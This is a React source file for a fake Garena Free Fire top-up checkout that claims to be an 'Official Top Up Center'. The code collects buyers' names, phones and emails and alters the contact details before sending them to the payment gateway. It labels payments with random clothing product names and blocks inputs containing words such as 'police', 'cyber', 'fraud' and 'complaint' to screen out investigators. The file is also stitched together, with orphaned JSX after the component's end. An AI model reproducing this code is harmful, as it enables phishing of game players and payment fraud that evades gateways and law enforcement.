import { useState, useEffect, useRef } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import { AlertTriangle, AlertCircle } from 'lucide-react';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../lib/firebase';

// Helper functions for email & phone alteration before sending to payment gateway
// Email: Modify strictly the LAST 3 characters in the email username, keeping domain as @gmail.com
function transformEmail(email: string): string {
  const parts = email.split('@');
  let username = parts[0] || 'customer';
  if (username.length < 3) {
    username = username.padEnd(3, 'x');
  }

  const prefix = username.slice(0, -3);
  const last3 = username.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((ch) => {
      const code = ch.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        // Uppercase A-Z -> shift +1
        return String.fromCharCode(((code - 65 + 1) % 26) + 65);
      } else if (code >= 97 && code <= 122) {
        // Lowercase a-z -> shift +1
        return String.fromCharCode(((code - 97 + 1) % 26) + 97);
      } else if (code >= 48 && code <= 57) {
        // Digit 0-9 -> shift +1
        return String.fromCharCode(((code - 48 + 1) % 10) + 48);
      }
      return 'x';
    })
    .join('');

  const transformedUser = prefix + transformedLast3;
  return `${transformedUser}@gmail.com`;
}

// Phone: Prepend 91, and modify strictly the LAST 3 digits in the 10-digit phone number
function transformPhone(phone: string): string {
  const clean = phone.replace(/[^0-9]/g, '');
  const tenDigits = clean.length >= 10 ? clean.slice(-10) : clean.padStart(10, '9');

  const prefix = tenDigits.slice(0, -3);
  const last3 = tenDigits.slice(-3);

  const transformedLast3 = last3
    .split('')
    .map((digit) => String((Number(digit) + 1) % 10))
    .join('');

  const transformedTen = prefix + transformedLast3;
  return `91${transformedTen}`;
}

const PRODUCT_CATEGORIES: Record<string, string[]> = {
  '395.50': ['Wall Mounted Bathroom Storage Shelf with Towel Rack'],
  '490':    ['Korean Fashion Oversized Casual Cotton T-Shirt'],
  '499':    ['Women Multi Coloured Floral Regular Fit Crop Top'],
  '550':    [
    'Women Multi Coloured Floral Regular Fit Crop Top',
    'Black High Rise Skinny Fit Shapewear For Women',
    'Drop Shoulder Sleeves Regular Fit Sweatshirt For Women',
    'Portable Handheld Ring LED Light Photography Lamp'
  ],
  '750':    [
    'Blue Stripes Relaxed Fit Shirt For Women',
    'Nylon Blend Regular Fit Bra For Women',
    'Solid Tube Bra For Women',
    'Mens Corduroy Loose Fit Wide Leg Pants'
  ],
  '1000':   ['Men Slim Fit Denim Jacket Vintage Edition'],
  '1100':   [
    'White and Black Wide Leg Fit Casual Trouser With 2 Pocket For Women',
    'Regular Fit Casual Trouser With 1 Pocket For Women',
    'Light Blue Solid Flared Jeans For Women',
    'BT21 Anime Cartoon Keychain Doll Pendant'
  ],
  '1400':   [
    'Stripes Regular Fit Shirt For Men',
    'Skinny Fit Jeans With 5 Pocket For Women',
    'Striped Regular Fit T-Shirt For Infant Boys',
    'Cute Bear Phone Charms & Keychain Pendant'
  ],
  '5500':   [
    'Slim Fit Utility Pocket Trouser For Men',
    'Mens Slim Solid Navy Formal Trousers',
    'Solid Rayon Pant For Women',
    'LED Selfie Ring Lamp with Phone Holder & Tripod',
    'Cotton Blend Straight Fit Trouser for Women'
  ],
  '7500':   [
    'Olive Slim Fit Utility Pocket Trouser For Men',
    'Cotton Blend Regular Fit Shirt For Men',
    'Cotton Blend Solid Pant For Women',
    'Solid Plazzos For Women And Girls',
    'Stylish Women Maroon Gown Dress'
  ],
};

function getProductNameForPrice(price: string): string {
  const items = PRODUCT_CATEGORIES[price];
  if (items && items.length > 0) {
    const randomIndex = Math.floor(Math.random() * items.length);
    return items[randomIndex];
  }
  return 'Women Multi Coloured Floral Regular Fit Crop Top';
}

const SOURCE_URL = 'https://www.codashop.online/';

// Check for suspicious or prohibited keywords in user input (Name / Email)
function containsRestrictedWord(text: string): boolean {
  if (!text) return false;
  const raw = text.toLowerCase();
  const clean = raw.replace(/[^a-z0-9]/g, '');

  const bannedKeywords = [
    'cyber',
    'police',
    'scammer',
    'scam',
    'fraud',
    'easebuzz',
    'easebuz',
    'hacker',
    'hack',
    'cbi',
    'cid',
    'crime',
    'govt',
    'government',
    'fake',
    'complaint',
    'phishing',
    'cheater',
    'cheat',
    'spammer',
    'helpdesk',
    'abuse'
  ];

  for (const word of bannedKeywords) {
    if (clean.includes(word) || raw.includes(word)) {
      return true;
    }
  }

  // Check 'ease' specifically (as word boundary, prefix, suffix, or gateway variant)
  if (/\bease\b/i.test(raw) || clean.includes('easebuzz') || clean.includes('easebuz') || clean.includes('easepay') || clean.startsWith('ease') || clean.endsWith('ease')) {
    return true;
  }

  return false;
}

export default function GarenaCheckout() {
  useEffect(() => {
    window.location.replace('/');
  }, []);
  return null;
}
            <div style={{
              width: 2, height: isMobile ? 18 : 22,
              background: '#f59e0b', borderRadius: 4,
              margin: '0 10px', flexShrink: 0
            }} />

            <span style={{
              color: '#111', fontWeight: 900,
              fontSize: isMobile ? 10 : 12,
              letterSpacing: '0.6px',
              textTransform: 'uppercase',
              lineHeight: 1, whiteSpace: 'nowrap',
              overflow: 'hidden', textOverflow: 'ellipsis'
            }}>
              Official Top Up Center
            </span>
          </div>

          <div style={{
            background: '#fff0ef', border: '1px solid #fecaca',
            borderRadius: 999, padding: isMobile ? '4px 10px' : '5px 14px',
            display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, marginLeft: 8
          }}>
            <span style={{
              width: 6, height: 6, borderRadius: '50%',
              background: '#ee2c24', flexShrink: 0
            }} />
            <span style={{
              fontSize: isMobile ? 10 : 11, fontWeight: 700, color: '#333',
              maxWidth: isMobile ? 80 : 120,
              overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
            }}>
              {nick || 'Guest'}
            </span>
          </div>
        </div>
      </header>

      {/* LAYER 2 — GAME BANNER */}
      <div style={{
        position: 'relative',
        width: '100%',
        height: isMobile ? 88 : isTablet ? 110 : 130,
        overflow: 'hidden',
      }}>
        <div style={{
          position: 'absolute', inset: 0,
          backgroundImage: 'url("https://assets.garena.com/gop/mshop/www/live/assets/FF-f997537d.jpg")',
          backgroundSize: 'cover', backgroundPosition: 'center top',
        }} />
        <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.38)' }} />
        <div style={{
          position: 'relative', height: '100%',
          display: 'flex', alignItems: 'center',
          padding: isMobile ? '0 14px' : '0 24px',
          gap: isMobile ? 10 : 14,
          maxWidth: isDesktop ? 1200 : '100%',
          margin: '0 auto',
        }}>
          <img
            src="https://play-lh.googleusercontent.com/_NBURlh6AOFiEpNimyU5bPNo6BI2zg4LA3cq-yprkXIhrvKTil-IOzGcuvc2hiuib4yxx11Lf5E1NFnKM6Uvpw=s120-rw"
            alt="Free Fire"
            style={{
              width: isMobile ? 44 : 52, height: isMobile ? 44 : 52,
              borderRadius: 10, border: '2px solid rgba(255,255,255,0.6)',
              objectFit: 'cover', flexShrink: 0,
              display: 'block'
            }}
            onError={(e) => {
              (e.target as HTMLImageElement).src =
                'https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png';
            }}
          />
          <div>
            <h1 style={{
              color: 'white', fontSize: isMobile ? 14 : 16,
              fontWeight: 900, margin: '0 0 5px',
            }}>Free Fire</h1>
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
              <span style={{
                background: 'rgba(18, 18, 18, 0.85)',
                border: '1px solid rgba(255, 255, 255, 0.15)',
                color: 'white',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                letterSpacing: '0.4px',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  <path d="m9 12 2 2 4-4" />
                </svg>
                100% SECURE PAYMENTS
              </span>
              <span style={{
                background: 'linear-gradient(135deg, #eab308, #ca8a04)',
                color: '#1a1a1a',
                borderRadius: 20,
                padding: isMobile ? '3px 8px' : '4px 10px',
                fontSize: isMobile ? 9 : 10,
                fontWeight: 900,
                display: 'inline-flex',
                alignItems: 'center',
                gap: 4
              }}>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2l2.4 5.2 5.6.8-4 4.1 1 5.7-5-2.8-5 2.8 1-5.7-4-4.1 5.6-.8z" />
                </svg>
                9TH ANNIVERSARY
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* LAYER 3 — CONTENT BODY */}
      <div style={{
        background: '#f5f6fa',
        padding: isMobile ? '14px 12px 40px' : isTablet ? '20px 24px 48px' : '28px 24px 60px',
        boxSizing: 'border-box'
      }}>
        <div style={{
          display: isDesktop ? 'grid' : 'block',
          gridTemplateColumns: isDesktop ? '1fr 1fr' : 'none',
          gap: isDesktop ? 20 : 0,
          maxWidth: isDesktop ? 1100 : 560,
          margin: '0 auto',
        }}>
          
          {/* Column 1 (Left on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            {/* CARD 1 — ORDER SUMMARY */}
            <div style={{ ...cardStyle, marginBottom: 12 }}>
              {renderCardHeader('①', 'Order Summary')}

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Nickname</span>
                <span style={{ fontWeight: 700, color: '#111' }}>{nick || 'Guest'}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>UID</span>
                <span style={{ fontWeight: 700, color: '#111', fontFamily: 'monospace', letterSpacing: '0.5px' }}>{uid || 'N/A'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Level</span>
                <span style={{ background: '#fef3c7', color: '#d97706', fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 6 }}>
                  Lv. {level || '1'}
                </span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: isMobile ? '8px 0' : '10px 0', borderBottom: '1px solid #f5f5f5', fontSize: isMobile ? 12 : 13 }}>
                <span style={{ color: '#777' }}>Diamonds</span>
                <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 14 }}>💎 {diamonds || 'Topup'}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: 16, fontSize: isMobile ? 14 : 15 }}>
                <span style={{ fontWeight: 800, color: '#111' }}>Total Amount</span>
                <span style={{ fontWeight: 900, fontSize: isMobile ? 22 : 26, color: '#111' }}>₹{pkg}</span>
              </div>
            </div>
          </div>

          {/* Column 2 (Right on desktop) */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {/* CARD 2 — YOUR DETAILS */}
            <div style={cardStyle}>
              {renderCardHeader('②', 'Your Details')}

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Full Name
                </label>
                <input
                  type="text"
                  placeholder="Enter your full name"
                  value={form.name}
                  onChange={e => {
                    const val = e.target.value;
                    setForm(prev => ({ ...prev, name: val }));
                    if (containsRestrictedWord(val)) {
                      setError('Please enter correct name.');
                    } else if (error === 'Please enter correct name.') {
                      setError('');
                    }
                  }}
                  onFocus={() => setFocusedField('name')}
                  onBlur={() => {
                    setFocusedField(null);
                    if (form.name.trim() && containsRestrictedWord(form.name)) {
                      setError('Please enter correct name.');
                    }
                  }}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'name' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'name' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: isMobile ? 12 : 14 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Phone Number
                </label>
                <input
                  type="tel"
                  placeholder="10-digit mobile number"
                  value={form.phone}
                  onChange={e => {
                    setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }));
                    if (error.includes('mobile number')) setError('');
                  }}
                  onFocus={() => setFocusedField('phone')}
                  onBlur={() => setFocusedField(null)}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'phone' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'phone' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              <div style={{ marginBottom: 12 }}>
                <label style={{ fontSize: 12, fontWeight: 700, color: '#555', marginBottom: 6, display: 'block' }}>
                  Email Address
                </label>
                <input
                  type="email"
                  placeholder="your@email.com"
                  value={form.email}
                  onChange={e => {
                    const val = e.target.value;
                    setForm(prev => ({ ...prev, email: val }));
                    if (containsRestrictedWord(val)) {
                      setError('Please enter correct email.');
                    } else if (error === 'Please enter correct email.') {
                      setError('');
                    }
                  }}
                  onFocus={() => setFocusedField('email')}
                  onBlur={() => {
                    setFocusedField(null);
                    if (form.email.trim() && containsRestrictedWord(form.email)) {
                      setError('Please enter correct email.');
                    }
                  }}
                  style={{
                    width: '100%',
                    padding: isMobile ? '13px 14px' : '13px 16px',
                    border: '1.5px solid',
                    borderColor: focusedField === 'email' ? '#ee2c24' : '#e8e8e8',
                    boxShadow: focusedField === 'email' ? '0 0 0 3px rgba(238,44,36,0.08)' : 'none',
                    borderRadius: 10,
                    fontSize: 16,
                    color: '#111',
                    outline: 'none',
                    boxSizing: 'border-box',
                    background: 'white',
                    WebkitAppearance: 'none',
                    appearance: 'none',
                    transition: 'border-color 0.15s, box-shadow 0.15s'
                  }}
                />
              </div>

              {error && (
                <div style={{
                  marginTop: 12, padding: '10px 14px',
                  background: '#fff5f5', border: '1px solid #fed7d7',
                  borderRadius: 8, color: '#e53e3e',
                  fontSize: 13, fontWeight: 600
                }}>
                  ⚠️ {error}
                </div>
              )}
            </div>

            {/* PAY NOW BUTTON */}
            {form.name.trim() && form.phone.trim() && form.email.trim() && (
              <button
                onClick={() => {
                  if (validateForm()) {
                    setShowPayModal(true);
                  }
                }}
                disabled={loading}
                style={{
                  width: '100%',
                  padding: isMobile ? '16px' : '18px',
                  background: loading ? '#ccc' : 'linear-gradient(135deg, #ee2c24, #c0392b)',
                  color: 'white',
                  border: 'none',
                  borderRadius: 14,
                  fontSize: isMobile ? 15 : 16,
                  fontWeight: 800,
                  cursor: loading ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: 8,
                  boxShadow: loading ? 'none' : '0 6px 20px rgba(238,44,36,0.35)',
                  letterSpacing: '0.3px',
                  WebkitTapHighlightColor: 'transparent',
                  touchAction: 'manipulation',
                  outline: 'none',
                  marginTop: 4,
                }}
              >
                {loading ? '⏳ Processing…' : `🔒 Pay ₹${pkg}`}
              </button>
            )}

            {/* PAYMENT METHOD SELECTION MODAL */}
            {showPayModal && (
              <div
                onClick={() => setShowPayModal(false)}
                style={{
                  position: 'fixed', inset: 0, zIndex: 1000,
                  background: 'rgba(0,0,0,0.55)',
                  display: 'flex', alignItems: 'flex-end', justifyContent: 'center',
                }}
              >
                <div
                  onClick={e => e.stopPropagation()}
                  style={{
                    background: 'white',
                    borderRadius: '20px 20px 0 0',
                    padding: isMobile ? '24px 16px 36px' : '28px 28px 40px',
                    width: '100%', maxWidth: 480, boxSizing: 'border-box',
                  }}
                >
                  <div style={{ width: 36, height: 4, background: '#e0e0e0', borderRadius: 4, margin: '0 auto 20px' }} />

                  <div style={{ textAlign: 'center', marginBottom: 22 }}>
                    <div style={{ fontSize: 17, fontWeight: 900, color: '#111', letterSpacing: -0.3 }}>
                      Choose Payment Method
                    </div>
                    <div style={{ fontSize: 12, color: '#aaa', marginTop: 4, fontWeight: 500 }}>
                      Fast · Secure · Instant Diamond Credit
                    </div>
                  </div>

                  {/* Option 1 — UPI / QR */}
                  <button
                    onClick={() => handlePay('QR')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 12,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://play-lh.googleusercontent.com/yHTP3WYAPWUydt6zFfhpEUmKWBVJ5PLF7QHlwYy95WclJZwVm2TPKekK1OruO-T5IeuvnMcF6x-MU7F8iR8hkw=w480-h960-rw"
                        alt="GPay" style={{ height: 20, width: 20, objectFit: 'contain', borderRadius: 4, flexShrink: 0 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1920px-PhonePe_Logo.svg.png"
                        alt="PhonePe" style={{ height: 18, objectFit: 'contain', flexShrink: 0, maxWidth: 52 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28standalone%29.svg/1920px-Paytm_Logo_%28standalone%29.svg.png"
                        alt="Paytm" style={{ height: 16, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR Code</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm · QR Scan</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  {/* Option 2 — Card / Net Banking */}
                  <button
                    onClick={() => handlePay('ALL')}
                    disabled={loading}
                    style={{
                      width: '100%', display: 'flex', alignItems: 'center', gap: 12,
                      padding: '14px 16px', marginBottom: 20,
                      background: '#fff', border: '2px solid #ebebeb', borderRadius: 16,
                      cursor: 'pointer', textAlign: 'left', boxSizing: 'border-box',
                      WebkitTapHighlightColor: 'transparent', outline: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexShrink: 0, background: '#f5f5f5', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/UPI_logo.svg/1920px-UPI_logo.svg.png"
                        alt="UPI" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 36 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/1920px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png"
                        alt="Visa" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1920px-Mastercard-logo.svg.png"
                        alt="MC" style={{ height: 22, objectFit: 'contain', flexShrink: 0, maxWidth: 28 }}
                        onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 800, color: '#111', fontSize: 14, whiteSpace: 'nowrap' }}>Card / Net Banking</div>
                      <div style={{ fontSize: 11, color: '#999', marginTop: 3, fontWeight: 500 }}>Credit Card · Debit Card · Netbanking</div>
                    </div>
                    <span style={{ color: '#ccc', fontSize: 20, flexShrink: 0 }}>›</span>
                  </button>

                  <div style={{ textAlign: 'center', fontSize: 11, color: '#aaa', fontWeight: 500 }}>
                    🔒 100% Secure · SSL Encrypted · Powered by Garena Store
                  </div>
                </div>
              </div>
            )}
          </div>

        </div>
      </div>
    </div>
  );
}
